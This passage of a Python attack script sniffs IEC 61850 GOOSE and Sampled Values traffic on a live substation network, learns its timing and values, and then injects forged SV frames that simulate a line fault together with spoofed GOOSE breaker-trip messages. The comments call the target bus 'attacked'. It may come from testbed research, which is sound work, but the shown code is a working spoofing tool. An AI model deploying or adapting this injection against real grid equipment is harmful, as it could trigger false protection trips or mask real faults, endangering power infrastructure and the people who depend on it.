            "How high the current spikes during the fault, as a multiple of "
            "normal (6.3 => 6.3x normal current). "
            "(default: %(default)s, calibrated to sv_range.pcapng)"
        )
    )
    parser.add_argument(
        '--fault-voltage',
        type=float,
        default=FAULT_SAG,
        metavar='FRAC',
        help=(
            "How far the voltage drops during the fault, as a fraction of "
            "normal (0.22 => drops to 22%% of normal). (default: %(default)s)"
        )
    )
    parser.add_argument(
        '--open-voltage',
        type=float,
        default=FAULT_SWELL,
        metavar='X',
        help=(
            "Voltage while the breaker is open, as a multiple of normal "
            "(1.07 => 7%% above normal). (default: %(default)s)"
        )
    )
    parser.add_argument(
        '--open-current',
        type=float,
        default=FAULT_OPEN_CURRENT,
        metavar='FRAC',
        help=(
            "Current while the breaker is open, as a fraction of normal "
            "(0.0 => dead line, no current). (default: %(default)s)"
        )
    )

    # ── Phase durations (how many packets each stage lasts) ───────────
    # Arc order: normal -> open -> fault -> normal. Each *-ramp is the smooth
    # transition into the state that follows it.
    parser.add_argument(
        '--normal-packets', type=int, default=FAULT_LEAD_SAMPLES, metavar='N',
        help="Packets of normal traffic before anything happens. (default: %(default)s)"
    )
    parser.add_argument(
        '--open-ramp-packets', type=int, default=FAULT_TRIP_SAMPLES, metavar='N',
        help="Packets to ease from normal into the breaker-open state "
             "(current -> ~0, voltage rises). (default: %(default)s)"
    )
    parser.add_argument(
        '--open-packets', type=int, default=FAULT_OPEN_SAMPLES, metavar='N',
        help="Packets held in the breaker-open state (dead line: current ~0, "
             "voltage high). (default: %(default)s)"
    )
    parser.add_argument(
        '--fault-ramp-packets', type=int, default=FAULT_ONSET_SAMPLES, metavar='N',
        help="Packets to ease from the open state into the fault "
             "(current surges, voltage drops). (default: %(default)s)"
    )
    parser.add_argument(
        '--fault-packets', type=int, default=FAULT_HOLD_SAMPLES, metavar='N',
        help="Packets held in the fault (high current, low voltage). "
             "(default: %(default)s)"
    )
    parser.add_argument(
        '--recover-packets', type=int, default=FAULT_RECLOSE_SAMPLES, metavar='N',
        help="Packets to ease from the fault back to normal. Ignored with "
             "--no-settle. (default: %(default)s)"
    )
    parser.add_argument(
        '--settle', default=FAULT_SETTLE, action=argparse.BooleanOptionalAction,
        help="After the fault, recover back to normal (--settle) or hold the "
             "fault indefinitely (--no-settle). (default: settle)"
    )

    return parser.parse_args()


# ─────────────────────────────────────────────────────────────────
#  Transmission (SV and GOOSE run concurrently on their own threads)
# ─────────────────────────────────────────────────────────────────

def _send_sv_stream(no_packets, target_key, vol_diff, cur_diff, last_sv, trip,
                    interface, interval_ms, replay_rows, recorded_rows=None,
                    onset_sample=None, onset_event=None):
    """Emit the multi-ASDU SV stream, pacing each packet by interval_ms (ms).

    When onset_event is supplied it is fired the instant the stream reaches
    onset_sample — the first sample of the abnormal phase — so a GOOSE thread
    waiting on it trips in lock-step with the fault actually hitting the wire.
    Firing from inside the real send loop means the timing inherently includes
    craft + send + pacing cost rather than an estimate.
    """
    last = last_sv
    for i in range(no_packets):
        if (onset_event is not None and onset_sample is not None
                and i == onset_sample):
            onset_event.set()
        sv_packet, latest_sv = craft_sv(target_key, vol_diff, cur_diff, last, trip,
                                        replay_rows, smp_index=i,
                                        recorded_rows=recorded_rows)
        last = latest_sv
        sendp(sv_packet, iface=interface, verbose=False)
        if interval_ms > 0 and i < no_packets - 1:
            time.sleep(interval_ms / 1000.0)
    # Safety net: if the window ended before onset_sample was reached, release
    # the GOOSE thread anyway so it can never block forever.
    if onset_event is not None:
        onset_event.set()


def _send_goose_stream(no_packets, busNumber, trip, interface,
                       interval_ms, start_delay_ms, start_event=None):
    """Emit the GOOSE stream after the IED-reaction delay, pacing by interval_ms.

    With start_event (AUTO IED-delay) the stream first blocks until the SV thread
    signals fault onset; start_delay_ms then adds any fixed IED processing latency
    on top. With no event (manual --ied-delay) it is just the old fixed pre-roll.
    """
    if start_event is not None:
        start_event.wait()
    if start_delay_ms > 0:
        time.sleep(start_delay_ms / 1000.0)
    for i in range(1, no_packets + 1):
        pkt = craft_goose(busNumber, trip, sqNum_increment=i)
        if pkt:
            sendp(pkt, iface=interface, verbose=False)
        if interval_ms > 0 and i < no_packets:
            time.sleep(interval_ms / 1000.0)


# ─────────────────────────────────────────────────────────────────
#  Entry point
# ─────────────────────────────────────────────────────────────────

def main():
    global time_diff, MIN_SV_ENTRIES
    global FAULT_SURGE, FAULT_SAG, FAULT_SWELL, FAULT_OPEN_CURRENT
    global FAULT_LEAD_SAMPLES, FAULT_ONSET_SAMPLES, FAULT_HOLD_SAMPLES
    global FAULT_TRIP_SAMPLES, FAULT_OPEN_SAMPLES, FAULT_RECLOSE_SAMPLES
    global FAULT_SETTLE

    args           = parse_arguments()
    interface_name = args.interface
    busNumber      = str(args.bus)
    trip           = args.trip
    no_packets     = args.packets
    MIN_SV_ENTRIES = args.min_sv

    # Fault-synthesis magnitudes and per-phase durations (in packets).
    FAULT_SURGE           = args.fault_current
    FAULT_SAG             = args.fault_voltage
    FAULT_SWELL           = args.open_voltage
    FAULT_OPEN_CURRENT    = args.open_current
    FAULT_LEAD_SAMPLES    = args.normal_packets
    FAULT_ONSET_SAMPLES   = args.fault_ramp_packets
    FAULT_HOLD_SAMPLES    = args.fault_packets
    FAULT_TRIP_SAMPLES    = args.open_ramp_packets
    FAULT_OPEN_SAMPLES    = args.open_packets
    FAULT_RECLOSE_SAMPLES = args.recover_packets
    FAULT_SETTLE          = args.settle

    #! For non-trip, the values will be taken as is.
    #! For trip, they will be extended or shortened accordingly if the values for each arc add up to
    #! more than the total.
    if trip:
        arc_len = (FAULT_LEAD_SAMPLES + FAULT_TRIP_SAMPLES + FAULT_OPEN_SAMPLES
                   + FAULT_ONSET_SAMPLES + FAULT_HOLD_SAMPLES
                   + (FAULT_RECLOSE_SAMPLES if FAULT_SETTLE else 0))
        if no_packets < arc_len:
            print(f"[main] --packets ({no_packets}) < fault arc ({arc_len} samples); "
                  f"extending to {arc_len} so the full trip sequence is emitted.")
            no_packets = arc_len

    #* Used to resync smpcnt later on
    capture_end_time = None


    print(f"[main] LIVE mode — listening on {interface_name} (filter: goose || sv)  min_sv_per_bucket={MIN_SV_ENTRIES}")

    #? Capture only goose and sv to rule out noise
    capture = pyshark.LiveCapture(interface=interface_name,display_filter='goose || sv',)

    #? Each packet that matches the filter, gets processed by their respective functions.
    for packet in capture.sniff_continuously():
        if "goose" in dir(packet):
            process_goose_packet(packet, busNumber)
        elif "sv" in dir(packet):
            process_sv_packet(packet, busNumber)

        n_count = len(seqdatas_normal.get(f"sv{busNumber}", []))
        t_count = len(seqdatas_tripped.get(f"sv{busNumber}", []))


        trip_ready = True

        if (len(time_diff) >= 40 and n_count >= MIN_SV_ENTRIES and trip_ready):
            print(f"[main] Break condition met: {len(time_diff)} GOOSE intervals | normal={n_count} tripped={t_count}")
            break

        # Progress hint every 10 intervals
        if len(time_diff) > 0 and len(time_diff) % 10 == 0:
            pending = []
            if n_count < MIN_SV_ENTRIES:
                pending.append(f"normal SV ({n_count}/{MIN_SV_ENTRIES})")
            if len(time_diff) < 250:
                pending.append(f"GOOSE intervals ({len(time_diff)}/40)")
            if pending:
                print(f"[main] Still waiting for: {', '.join(pending)}")

    big, average = processIntervals(time_diff)
    DEFAULT_GOOSE_INTERVAL_MS = average
    DEFAULT_SV_INTERVAL_MS = average
    print(f"[main] Avg Δt={average:.2f}ms  Max variance={big:.2f}ms")

    capture_end_time = time.time()   # baseline frozen here; resync from this


    # Can be used for future improvements if there is a need to record real faults.
    trip_data = seqdatas_tripped

    target_dataset = seqdatas_normal
    label          = "synthesized-fault" if trip else "normal"
    target_key     = f"sv{busNumber}"           # the bus being attacked
    print(f"[main] Using normal SV pool for crafting (target={target_key}, mode={label}).")

    if target_key not in sv_meta:
        print(f"[-] Aborting: target {target_key} not seen among captured publishers {sorted(sv_meta)}.")
        sys.exit(1)

    vol_diff, cur_diff, last_sv = sv_value_analysis(target_dataset, target_key=target_key, label=label)

    if not vol_diff or not cur_diff or not last_sv:
        print("[-] Aborting: insufficient SV data for crafting.")
        sys.exit(1)

    # Recorded rows for the target bus: each crafted sample is anchored to a real
    # measurement instead of random-walking from the previous output. replay_rows
    # holds every bus so the crafted frame re-emits all publishers in order.
    sv_rows     = list(target_dataset.get(target_key, []))
    replay_rows = target_dataset
    print(f"[main] Crafting {len(sv_meta)} ASDUs/frame "
          f"(target={target_key} crafted, others replayed).")


    # ── Derive the replay pacing from the captured intervals ──────
    # base_*_ms is the mean spacing seen on the wire; --speedup shrinks it.
    _, base_goose_ms = processIntervals(time_diff)
    _, base_sv_ms    = processIntervals(sv_time_diff)
    if base_sv_ms <= 0:
        base_sv_ms = DEFAULT_SV_INTERVAL_MS
    if base_goose_ms <= 0:
        base_goose_ms = DEFAULT_GOOSE_INTERVAL_MS

    factor        = max(0.0, 1.0 - args.speedup)
    sv_send_ms    = base_sv_ms * factor
    goose_send_ms = base_goose_ms * factor
    ied_delay_str = "auto" if args.ied_delay is None else f"{args.ied_delay:.1f}ms"
    print(f"[main] Pacing (speedup={args.speedup:.0%}): "
          f"SV {base_sv_ms:.3f}->{sv_send_ms:.3f}ms  "
          f"GOOSE {base_goose_ms:.3f}->{goose_send_ms:.3f}ms  "
          f"IED-delay={ied_delay_str}")


    # ── Manual replay gate ────────────────────────────────────────
    # Data collection / analysis is done and the crafter is armed, but nothing
    # has hit the wire yet. Hold here until the operator explicitly starts the
    # replay, so the injection can be timed against the live system. --auto-start
    # skips the prompt for unattended runs.
    if not args.auto_start:
        print("\n[main] Baseline collected and attack armed. "
              f"Ready to replay {no_packets} SV + {no_packets} GOOSE packets on "
              f"{interface_name}.")
        try:
            input("[main] Press ENTER to start the replay (Ctrl-C to abort)... ")
        except (EOFError, KeyboardInterrupt):
            print("\n[main] Replay aborted before sending. No packets sent.")
            sys.exit(0)

        # The live publisher advanced its smpCnt during the pause; catch our
        # frozen baseline up to the moment the operator hit ENTER.
        if capture_end_time is not None:
            resync_smpcnt(time.time() - capture_end_time, base_sv_ms)

    if args.ied_delay is None:
        onset_event  = threading.Event()
        onset_sample = FAULT_LEAD_SAMPLES if trip else 0
        goose_delay  = 0.0
        est_ms       = onset_sample * sv_send_ms
        print(f"[main] IED-delay: AUTO — GOOSE fires when SV reaches sample "
              f"{onset_sample} ({onset_sample} normal sample(s) first, "
              f"~{est_ms:.1f}ms + real send time).")
    else:
        onset_event  = None
        onset_sample = None
        goose_delay  = args.ied_delay
        print(f"[main] IED-delay: FIXED {goose_delay:.1f}ms pre-roll.")

    print(f"[main] Sending {no_packets} SV + {no_packets} GOOSE packets "
          f"on {interface_name}...")
    sv_thread = threading.Thread(
        target=_send_sv_stream,
        args=(no_packets, target_key, vol_diff, cur_diff, last_sv, trip,
              interface_name, sv_send_ms, replay_rows, sv_rows),
        kwargs={'onset_sample': onset_sample, 'onset_event': onset_event},
    )
    goose_thread = threading.Thread(
        target=_send_goose_stream,
        args=(no_packets, busNumber, trip, interface_name,
              goose_send_ms, goose_delay),
        kwargs={'start_event': onset_event},
    )
    sv_thread.start()
    goose_thread.start()
    sv_thread.join()
    goose_thread.join()

    print("[main] Done.")


if __name__ == "__main__":
    main()
